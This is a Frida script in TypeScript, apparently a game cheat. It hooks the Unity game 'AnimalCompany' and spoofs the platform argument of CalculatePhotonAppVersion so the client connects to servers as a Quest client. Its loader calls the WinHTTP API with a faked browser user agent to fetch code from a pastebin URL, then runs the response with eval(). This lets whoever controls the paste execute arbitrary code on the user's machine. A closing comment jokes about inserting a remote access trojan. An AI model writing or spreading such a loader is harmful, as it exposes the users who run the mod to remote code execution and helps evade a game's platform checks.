// @ts-nocheck
declare const ptr: any;
declare const Interceptor: any;
declare const Module: any;
declare const Memory: any;
declare const NativeFunction: any;
declare const Script: any;

const QUEST_PLATFORM = 1;
const SYMBOLS_URL = "https://pastebin.com/raw/VQrbehNF";

function parseUrl(url: string): {
  hostname: string;
  path: string;
  port: number;
} {
  const match = url.match(/^https?:\/\/([^/:]+)(?::(\d+))?(.*)$/);
  if (!match) {
    return { hostname: "", path: "/", port: 443 };
  }
  const hostname = match[1];
  const port = match[2]
    ? parseInt(match[2])
    : url.startsWith("https")
      ? 443  
      : 80;
  const path = match[3] || "/";
  return { hostname, path, port };
}

function httpRequest(
  url: string,
  method: string,
  headers: any,
  body?: string,  
): Promise<{ status: number; data: string }> {
  return new Promise((resolve) => {
    try {
      const winhttp = Module.load("winhttp.dll");

      const WinHttpOpen = new NativeFunction(
        winhttp.getExportByName("WinHttpOpen"),
        "pointer",
        ["pointer", "uint32", "pointer", "pointer", "uint32"],
      );

      const WinHttpConnect = new NativeFunction(
        winhttp.getExportByName("WinHttpConnect"),
        "pointer",
        ["pointer", "pointer", "uint32", "uint32"],
      );  

      const WinHttpOpenRequest = new NativeFunction(
        winhttp.getExportByName("WinHttpOpenRequest"),
        "pointer",
        [
          "pointer",
          "pointer",
          "pointer",
          "pointer",
          "pointer",
          "pointer",
          "uint32",
        ],
      );

      const WinHttpSendRequest = new NativeFunction(
        winhttp.getExportByName("WinHttpSendRequest"),
        "bool",
        [
          "pointer",
          "pointer",  
          "uint32",
          "pointer",
          "uint32",
          "uint32",
          "pointer",
        ],
      );

      const WinHttpReceiveResponse = new NativeFunction(
        winhttp.getExportByName("WinHttpReceiveResponse"),
        "bool",
        ["pointer", "pointer"],
      );

      const WinHttpQueryHeaders = new NativeFunction(
        winhttp.getExportByName("WinHttpQueryHeaders"),  
        "bool",
        ["pointer", "uint32", "pointer", "pointer", "pointer", "pointer"],
      );

      const WinHttpReadData = new NativeFunction(  
        winhttp.getExportByName("WinHttpReadData"),
        "bool",
        ["pointer", "pointer", "uint32", "pointer"],
      );

      const WinHttpCloseHandle = new NativeFunction(
        winhttp.getExportByName("WinHttpCloseHandle"),  
        "bool",
        ["pointer"],
      );

      const WinHttpSetOption = new NativeFunction(
        winhttp.getExportByName("WinHttpSetOption"),
        "bool",
        ["pointer", "uint32", "pointer", "uint32"],
      );

      const WinHttpSetTimeouts = new NativeFunction(
        winhttp.getExportByName("WinHttpSetTimeouts"),
        "bool",
        ["pointer", "int32", "int32", "int32", "int32"],
      );

      const GetLastError = new NativeFunction(
        Module.load("kernel32.dll").getExportByName("GetLastError"),
        "uint32",
        [],
      );

      const urlParts = parseUrl(url);
      const hostname = urlParts.hostname;
      const path = urlParts.path;
      const port = urlParts.port;

      const userAgent = Memory.allocUtf16String(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      );
      const hSession = WinHttpOpen(userAgent, 0, ptr(0), ptr(0), 0);

      if (hSession.isNull()) {
        resolve({
          status: 0,
          data: "WinHttpOpen failed (" + GetLastError() + ")",
        });
        return;
      }

      WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

      const hostnameW = Memory.allocUtf16String(hostname);
      const hConnect = WinHttpConnect(hSession, hostnameW, port, 0);

      if (hConnect.isNull()) {
        WinHttpCloseHandle(hSession);
        resolve({ status: 0, data: "WinHttpConnect failed" });
        return;
      }

      const pathW = Memory.allocUtf16String(path);
      const methodW = Memory.allocUtf16String(method);
      const hRequest = WinHttpOpenRequest(
        hConnect,
        methodW,
        pathW,
        ptr(0),
        ptr(0),
        ptr(0),
        url.startsWith("https") ? 0x00800000 : 0,
      );

      if (hRequest.isNull()) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resolve({ status: 0, data: "WinHttpOpenRequest failed" });
        return;
      }

      const flagsBuf = Memory.alloc(4);
      flagsBuf.writeU32(0x00000100 | 0x00000200 | 0x00001000 | 0x00002000);
      WinHttpSetOption(hRequest, 31, flagsBuf, 4);

      let headersStr = "";
      for (const key in headers) {
        headersStr += key + ": " + headers[key] + "\r\n";
      }
      const headersW = Memory.allocUtf16String(headersStr);

      const bodyPtr = body ? Memory.allocUtf8String(body) : ptr(0);
      const bodyLen = body ? body.length : 0;

      if (
        !WinHttpSendRequest(
          hRequest,
          headersW,
          -1,
          bodyPtr,
          bodyLen,
          bodyLen,
          ptr(0),
        )
      ) {
        const err = GetLastError();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resolve({ status: 0, data: "WinHttpSendRequest failed (" + err + ")" });
        return;
      }

      if (!WinHttpReceiveResponse(hRequest, ptr(0))) {
        const err = GetLastError();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resolve({
          status: 0,
          data: "WinHttpReceiveResponse failed (" + err + ")",
        });
        return;
      }

      const statusBuffer = Memory.alloc(4);
      const statusSize = Memory.alloc(4);
      statusSize.writeU32(4);

      WinHttpQueryHeaders(
        hRequest,
        0x20000013,
        ptr(0),
        statusBuffer,
        statusSize,
        ptr(0),
      );
      const statusCode = statusBuffer.readU32();

      const buffer = Memory.alloc(8192);
      const bytesRead = Memory.alloc(4);
      let responseData = "";

      while (WinHttpReadData(hRequest, buffer, 8192, bytesRead)) {
        const size = bytesRead.readU32();
        if (size === 0) break;
        responseData += buffer.readUtf8String(size);
      }

      WinHttpCloseHandle(hRequest);
      WinHttpCloseHandle(hConnect);
      WinHttpCloseHandle(hSession);

      resolve({ status: statusCode, data: responseData });
    } catch (e) {
      console.log("[-] HTTP request error: " + e);
      resolve({ status: 0, data: "Error: " + e });
    }
  });
}

async function loadQuestServers() {
  console.log("\n");
  console.log("------------------------------");
  console.log("[+] Connected to Quest Servers");
  console.log("[+] Made ItzDaTree");
  console.log("------------------------------");

  const symResponse = await httpRequest(SYMBOLS_URL, "GET", {});
  if (symResponse.status === 200) {
    try {
      eval(symResponse.data);

      const mapping: any = {
        il2cpp_init: "ZuUkKkBEyuG",
        il2cpp_init_utf16: "N_aazgFrcpB",
        il2cpp_shutdown: "uSHFwSzddjF",
        il2cpp_set_config_dir: "uWnuPnVcmVU",
        il2cpp_set_data_dir: "BJgZvfaXIJF",
        il2cpp_set_temp_dir: "lfnyjJjZUBK",
        il2cpp_set_commandline_arguments: "vPrTdgglJaY",
        il2cpp_set_commandline_arguments_utf16: "xIjPHXOUoCU",
        il2cpp_set_config_utf16: "trmPQmjdbiT",
        il2cpp_set_config: "ZDuxrWpqUis",
        il2cpp_set_memory_callbacks: "MQpjmvDZMgJ",
        il2cpp_memory_pool_set_region_size: "FoCgWNgxrMP",
        il2cpp_memory_pool_get_region_size: "rEajVbNhas_",
        il2cpp_get_corlib: "uJuZvxoHyuq",
        il2cpp_add_internal_call: "BeqoSfigEHP",
        il2cpp_resolve_icall: "NToqmSZcDah",
        il2cpp_alloc: "MciyqyZUqzs",
        il2cpp_free: "myRcHudfJNS",
        il2cpp_array_class_get: "bgUobcUUpTE",
        il2cpp_array_length: "lsJPqRstYLA",
        il2cpp_array_get_byte_length: "NSsoLruzGXt",
        il2cpp_array_new: "aQdOKYbbBOJ",
        il2cpp_array_new_specific: "ATbFTVpjrQk",
        il2cpp_array_new_full: "VKBSefqcAwV",
        il2cpp_bounded_array_class_get: "hmGtsgKkeoy",
        il2cpp_array_element_size: "JsmRANCfUUM",
        il2cpp_assembly_get_image: "pCFVwQfUQaq",
        il2cpp_class_for_each: "UKUgxQg_uWi",
        il2cpp_class_enum_basetype: "hqYnjwtvhPk",
        il2cpp_class_is_inited: "NTPZQsOdipA",
        il2cpp_class_is_generic: "JnzPPavbFjO",
        il2cpp_class_is_inflated: "UUdHwqVulNw",
        il2cpp_class_is_assignable_from: "hYofcHjBqGI",
        il2cpp_class_is_subclass_of: "s_RPDlWhWEg",
        il2cpp_class_has_parent: "SY_kuevLdwl",
        il2cpp_class_from_il2cpp_type: "YApSIjSAYuS",
        il2cpp_class_from_name: "QSBbaDLowpv",
        il2cpp_class_from_system_type: "ye_kIUmSOEO",
        il2cpp_class_get_element_class: "kJAvJqHIqMF",
        il2cpp_class_get_events: "jTSFrLDzTcq",
        il2cpp_class_get_fields: "eeTGKyDXMxS",
        il2cpp_class_get_nested_types: "nBuNvuBcCWJ",
        il2cpp_class_get_interfaces: "FUkBlTfeNwA",
        il2cpp_class_get_properties: "NiwNuuVDkVS",
        il2cpp_class_get_property_from_name: "LBzLuvzVOUt",
        il2cpp_class_get_field_from_name: "JBULiaw_kdI",
        il2cpp_class_get_methods: "IDwwTAKBvKD",
        il2cpp_class_get_method_from_name: "RESTrUAcETG",
        il2cpp_class_get_name: "fzrvHsqLxGB",
        il2cpp_type_get_name_chunked: "rvITjMtkupM",
        il2cpp_class_get_namespace: "__UULjyqLnc",
        il2cpp_class_get_parent: "WWKflrBBxHq",
        il2cpp_class_get_declaring_type: "kLexofAbldI",
        il2cpp_class_instance_size: "hyMJiPpyMKf",
        il2cpp_class_num_fields: "COCJAQXfsXZ",
        il2cpp_class_is_valuetype: "FHMKhLgwoyG",
        il2cpp_class_value_size: "yGB_eoeChIo",
        il2cpp_class_is_blittable: "xbBjTxepYgh",
        il2cpp_class_get_flags: "FYizmfwVeai",
        il2cpp_class_is_abstract: "ekNbDUfwruU",
        il2cpp_class_is_interface: "afMacrJwWGT",
        il2cpp_class_array_element_size: "WLSlAqDvTyp",
        il2cpp_class_from_type: "YApSIjSAYuS",
        il2cpp_class_get_type: "VtpQbPccYvi",
        il2cpp_class_get_type_token: "YLBlYHOLBMg",
        il2cpp_class_has_attribute: "ofQyjiPylvS",
        il2cpp_class_has_references: "_SNTECrPBNY",
        il2cpp_class_is_enum: "AgNWzLhizof",
        il2cpp_class_get_image: "qgwGnwSQAHt",
        il2cpp_class_get_assemblyname: "nlqzfDOfmvD",
        il2cpp_class_get_rank: "SErBKZEDHWq",
        il2cpp_class_get_data_size: "cWriMMhubQl",
        il2cpp_class_get_static_field_data: "rftSOOp_iLQ",
        il2cpp_stats_dump_to_file: "aW_OLbMnolF",
        il2cpp_stats_get_value: "bnUGcdmHztW",
        il2cpp_domain_get: "UmHolsQnHNI",
        il2cpp_domain_get_assemblies: "aEARmkzVXdT",
        il2cpp_raise_exception: "MlbuWjoUSEJ",
        il2cpp_exception_from_name_msg: "Qra_pDiNuES",
        il2cpp_get_exception_argument_null: "ptZyhavOWgm",
        il2cpp_format_exception: "ukmlWlCYest",
        il2cpp_format_stack_trace: "jkkbQcXkWGl",
        il2cpp_unhandled_exception: "rfvbuWuPtUg",
        il2cpp_native_stack_trace: "HDKubecrJIA",
        il2cpp_field_get_flags: "wQxuCUVYfYX",
        il2cpp_field_get_from_reflection: "CyLzdJSWoda",
        il2cpp_field_get_name: "eFNjmLbKidQ",
        il2cpp_field_get_parent: "CyLzdJSWoda",
        il2cpp_field_get_object: "GxmHUxZbcgx",
        il2cpp_field_get_offset: "jLVcLPkNPNA",
        il2cpp_field_get_type: "CyLzdJSWoda",
        il2cpp_field_get_value: "my_hGNtnMac",
        il2cpp_field_get_value_object: "bXnvSmzxoIh",
        il2cpp_field_has_attribute: "fIETKkCsvKM",
        il2cpp_field_set_value: "KVfdrdQYnod",
        il2cpp_field_static_get_value: "TbAekGGzFKH",
        il2cpp_field_static_set_value: "yMonwbWBBBQ",
        il2cpp_field_set_value_object: "BTjqyDKSdMX",
        il2cpp_field_is_literal: "caoqgGcHBAz",
        il2cpp_gc_collect: "JZAFkFCzVfb",
        il2cpp_gc_collect_a_little: "BpGhQDp_ZjI",
        il2cpp_gc_start_incremental_collection: "GnPpkkvMhjh",
        il2cpp_gc_disable: "qYqXMuRCEPu",
        il2cpp_gc_enable: "kaBgMtwmUrQ",
        il2cpp_gc_is_disabled: "CrrrelSrpQU",
        il2cpp_gc_set_mode: "_nRiUkdKJQL",
        il2cpp_gc_get_max_time_slice_ns: "wiwAryeAseM",
        il2cpp_gc_set_max_time_slice_ns: "ZsSwPLKwpgs",
        il2cpp_gc_is_incremental: "eBxEzRtrAxT",
        il2cpp_gc_get_used_size: "nnXZxiRSeaC",
        il2cpp_gc_get_heap_size: "QPvWGiuRtqA",
        il2cpp_gc_wbarrier_set_field: "UjptZkBjFLh",
        il2cpp_gc_has_strict_wbarriers: "bawzZvhWYSh",
        il2cpp_gc_set_external_allocation_tracker: "YoVFrpBHvZt",
        il2cpp_gc_set_external_wbarrier_tracker: "unSlIgJPNug",
        il2cpp_gc_foreach_heap: "HCWWRTkhxqh",
        il2cpp_stop_gc_world: "GIZHqomOUnT",
        il2cpp_start_gc_world: "GAHEqmIhMYX",
        il2cpp_gc_alloc_fixed: "kECEBSvHvlY",
        il2cpp_gc_free_fixed: "cEHRrNZofQS",
        il2cpp_gchandle_new: "ZTwPytWFCDK",
        il2cpp_gchandle_new_weakref: "JPPzPlgOhal",
        il2cpp_gchandle_get_target: "QUkXQwCHNTf",
        il2cpp_gchandle_free: "dufhjGsqOcp",
        il2cpp_gchandle_foreach_get_target: "qrencKvlGZm",
        il2cpp_object_header_size: "SUARDQkkCHV",
        il2cpp_array_object_header_size: "FBosniRFlYW",
        il2cpp_offset_of_array_length_in_array_object_header: "_QOvYshZBGx",
        il2cpp_offset_of_array_bounds_in_array_object_header: "_vpkDk_fuHY",
        il2cpp_allocation_granularity: "SUARDQkkCHV",
        il2cpp_unity_liveness_allocate_struct: "XwgOIgxqIlt",
        il2cpp_unity_liveness_calculation_from_root: "OocjZIpfoXN",
        il2cpp_unity_liveness_calculation_from_statics: "RkdPOGyjBMG",
        il2cpp_unity_liveness_finalize: "GUNyxMvJjmT",
        il2cpp_unity_liveness_free_struct: "oTOKudmAATF",
        il2cpp_method_get_return_type: "CyLzdJSWoda",
        il2cpp_method_get_declaring_type: "XLoNCgZSibp",
        il2cpp_method_get_name: "XLoNCgZSibp",
        il2cpp_method_get_from_reflection: "XfLxrfIJjfN",
        il2cpp_method_get_object: "nCPBoXcgcQj",
        il2cpp_method_is_generic: "ocTRVkyOBPg",
        il2cpp_method_is_inflated: "uQJvyusnxHO",
        il2cpp_method_is_instance: "bNMcmlgJiBA",
        il2cpp_method_get_param_count: "GGVFO_lOojW",
        il2cpp_method_get_param: "zrKiEkqmTDj",
        il2cpp_method_get_class: "DTwNaO_loUo",
        il2cpp_method_has_attribute: "xfCZLgXmXHU",
        il2cpp_method_get_flags: "BzWLsKsHooC",
        il2cpp_method_get_token: "EmotDqrXlNG",
        il2cpp_method_get_param_name: "aYSRDYQRkKg",
        il2cpp_property_get_flags: "idiproNxxwa",
        il2cpp_property_get_get_method: "CyLzdJSWoda",
        il2cpp_property_get_set_method: "XLoNCgZSibp",
        il2cpp_property_get_name: "DTwNaO_loUo",
        il2cpp_property_get_parent: "CyLzdJSWoda",
        il2cpp_object_get_class: "QpKGsrkTECW",
        il2cpp_object_get_size: "YGXGPaEckKr",
        il2cpp_object_get_virtual_method: "GasyKUxhheV",
        il2cpp_object_new: "mOhezmhpJrQ",
        il2cpp_object_unbox: "olgykHhmurA",
        il2cpp_value_box: "RkjA_gBwNYv",
        il2cpp_monitor_enter: "ICCdPzftavE",
        il2cpp_monitor_try_enter: "UpGhjVuYkqZ",
        il2cpp_monitor_exit: "sVXhHAzsjeJ",
        il2cpp_monitor_pulse: "PqhcIyVZcsk",
        il2cpp_monitor_pulse_all: "GsHAahFEpTP",
        il2cpp_monitor_wait: "sGCVhQYaxWO",
        il2cpp_monitor_try_wait: "jMDHBSDFlfK",
        il2cpp_runtime_invoke: "WTRSXJPQWgr",
        il2cpp_runtime_invoke_convert_args: "TdSUjLtSZ_z",
        il2cpp_runtime_class_init: "iKivVFkVMqG",
        il2cpp_runtime_object_init: "lHwvkbGTtaF",
        il2cpp_runtime_object_init_exception: "ctqVSfqaBmX",
        il2cpp_runtime_unhandled_exception_policy_set: "CcIMNXPVzYd",
        il2cpp_string_length: "idiproNxxwa",
        il2cpp_string_chars: "oftGYVdyqMo",
        il2cpp_string_new: "jxkQq_peyRQ",
        il2cpp_string_new_len: "gAegMRqYiDa",
        il2cpp_string_new_utf16: "OTNSbcvBbzD",
        il2cpp_string_new_wrapper: "jxkQq_peyRQ",
        il2cpp_string_intern: "oXMGfrCvsCr",
        il2cpp_string_is_interned: "mVgqtygiNLE",
        il2cpp_thread_current: "NXUcuHMuknS",
        il2cpp_thread_attach: "tDuZYHWDTMy",
        il2cpp_thread_detach: "qpPGHUZrQdx",
        il2cpp_is_vm_thread: "XDtyJZJBPCd",
        il2cpp_current_thread_walk_frame_stack: "H_fkhYEmKhv",
        il2cpp_thread_walk_frame_stack: "Q_jpumImbHo",
        il2cpp_current_thread_get_top_frame: "sAZUAPdFHBw",
        il2cpp_thread_get_top_frame: "sWCkCwilFDY",
        il2cpp_current_thread_get_frame_at: "sAZUAPdFHBw",
        il2cpp_thread_get_frame_at: "WlFmsXGBIWP",
        il2cpp_current_thread_get_stack_depth: "MkHgJaEQZLY",
        il2cpp_thread_get_stack_depth: "UtuAEEnsZgO",
        il2cpp_override_stack_backtrace: "DUaihj_EGhs",
        il2cpp_type_get_object: "UlkHjhUjDqu",
        il2cpp_type_get_type: "PbOVASwAvwv",
        il2cpp_type_get_class_or_element_class: "oAWaWFXIePg",
        il2cpp_type_get_name: "GKOWt_cFFVx",
        il2cpp_type_is_byref: "KcjeQKcBwnt",
        il2cpp_type_get_attrs: "PEZzoHmsWmD",
        il2cpp_type_equals: "cyYaNxjj_Wz",
        il2cpp_type_get_assembly_qualified_name: "N_aazgFrcpB",
        il2cpp_type_get_reflection_name: "N_aazgFrcpB",
        il2cpp_type_is_static: "CdKhETsdKPJ",
        il2cpp_type_is_pointer_type: "XikoFKLDRZm",
        il2cpp_image_get_assembly: "CyLzdJSWoda",
        il2cpp_image_get_name: "XLoNCgZSibp",
        il2cpp_image_get_filename: "XLoNCgZSibp",
        il2cpp_image_get_entry_point: "QTSvDCCBXpz",
        il2cpp_image_get_class_count: "OVAOWwmUFrU",
        il2cpp_image_get_class: "FMaMGKdwqOQ",
        il2cpp_capture_memory_snapshot: "GYFErJPhnsj",
        il2cpp_free_captured_memory_snapshot: "DbxkWPcQMMP",
        il2cpp_set_find_plugin_callback: "dENlUnmLZlM",
        il2cpp_register_log_callback: "R_CzKSOlCJH",
        il2cpp_debugger_set_agent_options: "PWEjBzCuzVp",
        il2cpp_is_debugger_attached: "_MVcGPPd_up",
        il2cpp_register_debugger_agent_transport: "kKeoETaftlv",
        il2cpp_debug_foreach_method: "xiTyyYpGcun",
        il2cpp_debug_get_method_info: "BxsVYTHYQWZ",
        il2cpp_unity_install_unitytls_interface: "MzGTQvxVmvO",
        il2cpp_custom_attrs_from_class: "_pMRemnpyNq",
        il2cpp_custom_attrs_from_method: "VXOnS_hInIb",
        il2cpp_custom_attrs_from_field: "gcuhOYWABFf",
        il2cpp_custom_attrs_get_attr: "mh_RAsMnZDb",
        il2cpp_custom_attrs_has_attr: "phVOnsioSIs",
        il2cpp_custom_attrs_construct: "qFDXUFnplwY",
        il2cpp_custom_attrs_free: "mOzjNtIxq_X",
        il2cpp_class_set_userdata: "mhhwMblXZVt",
        il2cpp_class_get_userdata_offset: "pmKhDXIlsI_",
        il2cpp_set_default_thread_affinity: "IHUsYAyhtXa",
        il2cpp_unity_set_android_network_up_state_func: "zsTvGWifmNP",
        il2cpp_domain_assembly_open: "iNCjiOrfHFR",

    };

      const symbols = (Il2Cpp as any).$config.exports;
      if (symbols) {
        for (const key in symbols) {
          if (mapping[key]) {
            symbols[mapping[key]] = symbols[key];
          }
        }
      }

  Il2Cpp.perform(() => {
    const findClass = (n: string) => {
      for (const a of Il2Cpp.domain.assemblies) {
        try {
          const k = a.image.tryClass(n);
          if (k) return k;
        } catch (_) {}
      }
      return null;
    };

    const AppUtils = findClass("AnimalCompany.AppUtils");
    if (!AppUtils) {
      console.log("[-] AppUtils not found");
      return;
    }

    let method: any = null;
    for (const m of AppUtils.methods) {
      if (
        /CalculatePhotonAppVersion/i.test(m.name) &&
        (m.returnType?.name || "") === "System.String"
      ) {
        method = m;
        break;
      }
    }

    if (!method) {
      console.log("[-] CalculatePhotonAppVersion not found");
      return;
    }

    Interceptor.attach(method.virtualAddress, {
      onEnter(args: any) {
        try {
          args[2] = ptr(QUEST_PLATFORM);
        } catch (_) {}
      },
    });
  });
    } catch (e) {
      console.log("[-] Error: " + e);
    }
  }
}
// insert rat here because im totally byte 
loadQuestServers();